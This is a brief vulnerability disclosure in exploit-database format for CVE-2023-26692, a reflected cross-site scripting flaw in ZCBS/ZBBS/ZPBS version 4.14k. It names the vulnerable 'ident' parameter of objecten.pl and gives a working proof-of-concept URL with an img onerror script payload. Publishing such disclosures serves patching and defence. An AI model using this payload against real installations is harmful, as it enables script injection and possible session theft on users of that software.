# CVE-2023-26692
 ZCBS/ZCBS/ZPBS/ZBBS Reflected XSS
 
#### Exploit Title: ZCBS/ZBBS/ZPBS v4.14k - Reflected XSS
#### Date: 2023-03-30
#### CVE: CVE-2023-26692
#### Exploit Author: Abdulaziz Saad (@b4zb0z)
#### Vendor Homepage: https://www.zcbs.nl
#### Software Link: https://www.zcbs.nl/cgi-bin/objecten.pl
#### Version: 4.14k
#### Tested on: LAMP, Ubuntu

---
[#] Vulnerability :
`$_GET['ident']`

[#] Exploitation :
`https://localhost/cgi-bin/objecten.pl?ident=%3Cimg%20src=x%20onerror=alert(%22XSS%22)%3E`
